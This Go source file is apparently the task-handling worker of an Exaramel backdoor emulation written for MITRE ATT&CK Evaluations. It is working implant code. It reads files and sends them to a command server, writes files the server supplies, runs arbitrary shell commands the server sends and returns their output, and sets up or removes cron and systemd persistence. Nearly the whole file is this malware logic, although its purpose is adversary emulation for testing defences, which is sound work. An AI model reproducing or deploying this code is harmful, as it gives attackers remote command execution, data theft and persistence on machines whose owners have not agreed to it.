package worker

import (
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"

	"attackevals.mitre-engenuity.org/exaramel/configur"
	"attackevals.mitre-engenuity.org/exaramel/logger"
	"attackevals.mitre-engenuity.org/exaramel/networker"
	"github.com/google/shlex"
)

func handleErr(err error) error {
	logger.Error(err)
	return err
}

// Returns boolean value representing whether or not the server sent a success message on report submission.
func isReportSuccess(report networker.Reports) bool {
	return report.Response.Status != 0
}

// Write command result to disk before result is sent to server.
// If sending the result to the server fails, the main loop reattempts sending later until successful.
func writeReportToDisk(taskId uint32, contents string) error {
	reportFileName := strconv.Itoa(int(taskId)) + ".rep"
	if err := ioutil.WriteFile(reportFileName, []byte(contents), 0644); err != nil {
		return handleErr(err)
	}
	return nil
}

// Delete command result from disk after result is successfully sent to server.
func deleteReportFromDisk(taskId uint32) error {
	reportFileName := strconv.Itoa(int(taskId)) + ".rep"
	if err := os.Remove(reportFileName); err != nil {
		return handleErr(err)
	}
	return nil
}

// Determine function to run based on task method sent by server.
// Only File read and write, and Shell execute are implemented for the purposes of ATT&CK Evaluations.
func DirectCommand(task networker.TaskResponse) error {
	switch task.Method {
	case "App.Delete":
		break
	case "App.SetServer":
		break
	case "App.SetProxy":
		break
	case "App.SetTimeout":
		break
	case "App.Update":
		break
	case "IO.ReadFile":
		return IOReadFile(task)
	case "IO.WriteFile":
		return IOWriteFile(task)
	case "OS.ShellExecute":
		return OSShellExecute(task)
	case "App.Persist":
		return AppPersist(task)
	case "App.DeletePersistence":
		return AppDeletePersistence(task)
	default:
		break
	}
	return nil
}

// Send an error report to the server if running the server's command results in an error.
func handleCommandError(taskId uint32, message string) error {
	logger.Info(fmt.Sprintf("Task %v not successfully sent to server, handling", strconv.Itoa(int(taskId))))
	if err := writeReportToDisk(taskId, message); err != nil {
		logger.Error("Error report not written to disk: " + err.Error())
	}
	reportResult, err := networker.SendReport(taskId, message, false)
	if err != nil {
		return handleErr(err)
	}
	if isReportSuccess(reportResult) {
		if err = deleteReportFromDisk(taskId); err != nil {
			return handleErr(err)
		}
		return nil
	}
	return errors.New("command error report response not 1")
}

// Send contents of file on disk to the server.
// task.Arguments contains the name of the file to read.
// A report is only written to disk if the file read or sending the file fails.
func IOReadFile(task networker.TaskResponse) error {
	logger.Info(fmt.Sprintf("Received read file command for %v as part of task %v", task.Arguments, task.ID))
	reportResult, err := networker.SendReport(task.ID, task.Arguments, true)
	if err != nil {
		return handleCommandError(task.ID, err.Error())
	}
	if !isReportSuccess(reportResult) {
		message := "Server returned incorrect response on sending file."
		logger.Warning(message)
		if err := writeReportToDisk(task.ID, message); err != nil {
			logger.Error("Error report not written to disk: " + err.Error())
		}
	}
	return nil
}

// Get file contents from server and write to specified location on disk.
// task.Arguments contains file path to write to.
func IOWriteFile(task networker.TaskResponse) error {

	logger.Info(fmt.Sprintf("Received write file command for %v as part of task %v", task.Arguments, task.ID))
	fileContents, err := networker.GetFile(task.ID)
	if err != nil {
		return handleCommandError(task.ID, err.Error())
	}

	if isErrorResp, errorMessage := networker.IsResponseError(fileContents); isErrorResp {
		return handleCommandError(task.ID, errorMessage)
	}

	if err = ioutil.WriteFile(task.Arguments, fileContents, 0644); err != nil {
		return handleCommandError(task.ID, err.Error())
	}

	message := "File successfully written to disk"
	if err = writeReportToDisk(task.ID, message); err != nil {
		logger.Error("Report not written to disk: " + err.Error())
	}

	reportResult, err := networker.SendReport(task.ID, message, false)
	if err != nil {
		return handleErr(err)
	}

	if isReportSuccess(reportResult) {
		if err = deleteReportFromDisk(task.ID); err != nil {
			return handleErr(err)
		}
		return nil
	}
	return nil
}

// Runs OS.ShellExecute command sent by server.
// Output of command is written to disk and sent to server using SendReport().
// If SendReport() is successful, the output written to disk is deleted.
func OSShellExecute(task networker.TaskResponse) error {
	logger.Info(fmt.Sprintf("Received shell execute command %v as part of task %v", task.Arguments, task.ID))
	arguments, err := shlex.Split(task.Arguments)
	if err != nil {
		return handleCommandError(task.ID, err.Error())
	}
	output, err := execShell(arguments)
	if err != nil {
		return handleCommandError(task.ID, err.Error())
	}
	if err = writeReportToDisk(task.ID, string(output[:])); err != nil {
		logger.Error("Report not written to disk: " + err.Error())
	}
	reportResult, err := networker.SendReport(task.ID, string(output[:]), false)
	if err != nil {
		return handleErr(err)
	}
	if isReportSuccess(reportResult) {
		if err = deleteReportFromDisk(task.ID); err != nil {
			return handleErr(err)
		}
		return nil
	}
	err = errors.New("OSShellExecute Command report response not 1")
	return handleErr(err)
}

// Perform actual execution
func execShell(args []string) ([]byte, error) {
	if len(args) > 1 {
		return exec.Command(args[0], args[1:]...).Output()
	} else {
		return exec.Command(args[0]).Output()
	}
}

func AppPersist(task networker.TaskResponse) error {
	var err error
	var output string
	switch task.Arguments {
	case "cron":
		err = configur.SetupCrontabPersistence()
		output = "Crontab Persistence Successful"
	case "systemd":
		err = configur.SetupSystemdPersistence()
		output = "Systemd Persistence Successful"
	default:
		return fmt.Errorf("Only persistence mechanisms are 'cron' and 'systemd', received %v", task.Arguments)
	}

	if err != nil {
		return handleCommandError(task.ID, err.Error())
	}
	if err = writeReportToDisk(task.ID, output); err != nil {
		logger.Error("Report not written to disk: " + err.Error())
	}
	reportResult, err := networker.SendReport(task.ID, output, false)
	if err != nil {
		return handleErr(err)
	}
	if isReportSuccess(reportResult) {
		if err = deleteReportFromDisk(task.ID); err != nil {
			return handleErr(err)
		}
		return nil
	}
	err = errors.New("Persistence Command report response not 1")
	return handleErr(err)
}

func AppDeletePersistence(task networker.TaskResponse) error {
	var err error
	var output string
	switch task.Arguments {
	case "cron":
		err = configur.DeleteCrontabPersistence()
		output = "Deletion of Crontab Persistence successful"
	case "systemd":
		err = configur.DeleteSystemdPersistence()
		output = "Deletion of Systemd Persistence successful"
	default:
		return fmt.Errorf("Only persistence mechanisms are 'cron' and 'systemd', received %v", task.Arguments)
	}

	if err != nil {
		return handleCommandError(task.ID, err.Error())
	}
	if err = writeReportToDisk(task.ID, output); err != nil {
		logger.Error("Report not written to disk: " + err.Error())
	}
	reportResult, err := networker.SendReport(task.ID, output, false)
	if err != nil {
		return handleErr(err)
	}
	if isReportSuccess(reportResult) {
		if err = deleteReportFromDisk(task.ID); err != nil {
			return handleErr(err)
		}
		return nil
	}
	err = errors.New("Persistence Deletion Command report response not 1")
	return handleErr(err)
}

// When a task report is not sent successfully to the server, it remains on disk as a file.
// This function goes through all report files in Exaramel's directory, and reattempts sending the report to the server.
func ProcessReportFiles() error {
	files, err := ioutil.ReadDir(".")
	if err != nil {
		return handleErr(err)
	}
	var reportFilenames []string

	reg, err := regexp.Compile("[.]rep")
	if err != nil {
		return handleErr(err)
	}

	for _, file := range files {
		matched := reg.MatchString(file.Name())
		if err != nil {
			logger.Error(err)
		}
		if matched {
			reportFilenames = append(reportFilenames, file.Name())
		}
	}
	for _, filename := range reportFilenames {
		readAndSendReport(filename)
	}
	return nil
}

// Perform individual report file processing. The report name contains the Task ID.
// If the report is sent successfully, the report file is deleted from disk.
func readAndSendReport(reportName string) error {
	logger.Info("Processing report file: " + reportName)
	taskIdStr := strings.TrimSuffix(reportName, ".rep")
	taskIdInt, err := strconv.Atoi(taskIdStr)
	if err != nil {
		return handleErr(err)
	}
	reportContents, err := ioutil.ReadFile(reportName)
	if err != nil {
		return handleErr(err)
	}
	reportResult, err := networker.SendReport(uint32(taskIdInt), string(reportContents[:]), false)
	if err != nil {
		return handleErr(err)
	}
	if isReportSuccess(reportResult) {
		logger.Success("Report sent successfully, deleting report file")
		if err = deleteReportFromDisk(uint32(taskIdInt)); err != nil {
			return handleErr(err)
		}
		return nil
	}
	logger.Warning("Report did not send successfully")
	return nil
}
